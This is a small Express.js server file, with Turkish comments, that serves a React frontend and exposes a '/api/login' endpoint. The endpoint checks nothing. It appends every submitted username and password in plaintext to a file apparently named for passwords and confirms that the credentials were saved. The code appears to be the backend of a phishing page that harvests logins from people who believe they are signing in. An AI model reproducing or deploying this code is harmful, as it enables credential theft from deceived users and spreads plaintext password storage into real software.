const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(bodyParser.json());
app.use(cors());

// Login endpoint
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password are required.' });
  }

  const data = `Username: ${username}, Password: ${password}\n`;
  const filePath = path.join(__dirname, 'sifreler.db');

  fs.appendFile(filePath, data, (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).json({ message: 'Failed to save credentials.' });
    }
    res.status(200).json({ message: 'Credentials saved successfully.' });
  });
});

// Eğer frontend'i aynı servisten çalıştırmak istiyorsan:
app.use(express.static(path.join(__dirname, 'frontend/dist')));

// React router fallback (Express 5 uyumlu, path-to-regexp hatası vermez)
app.use((req, res) => {
  res.sendFile(path.join(__dirname, 'frontend/dist', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

